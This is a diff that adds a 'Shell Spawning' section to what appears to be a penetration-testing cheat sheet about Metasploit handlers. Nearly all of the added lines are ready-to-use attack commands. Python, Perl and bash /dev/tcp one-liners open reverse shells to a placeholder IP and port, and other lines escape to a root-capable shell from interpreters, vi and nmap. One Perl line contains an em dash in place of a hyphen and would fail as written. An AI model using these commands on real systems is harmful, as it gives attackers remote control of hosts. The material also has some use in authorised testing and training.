@@ -406,6 +406,35 @@ Metasploit handlers can be great at quickly setting up Metasploit to be in a pos
 	
 	exploit -j -z
 
+# Shell Spawning
+
+	python -c 'import pty; pty.spawn("/bin/sh")'
+	
+	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<[IP]>",<[PORT]>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+	
+	echo os.system('/bin/bash')
+	
+	/bin/sh -i
+	
+	exec 5<>/dev/tcp/<[IP]>/<[PORT]> cat <&5 | while read line; do $line 2>&5 >&5; done
+	
+	perl —e 'exec "/bin/sh";'
+	
+	perl: exec "/bin/sh";
+	
+	perl -e 'use Socket;$i="<[IP]>";$p=<[PORT]>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+	
+	ruby: exec "/bin/sh"
+	
+	lua: os.execute('/bin/sh')
+	
+	(From within IRB) exec "/bin/sh"
+	
+	(From within vi) :!bash
+	
+	(From within vi) :set shell=/bin/bash:shell
+	
+	(From within nmap) !sh
 
 
 
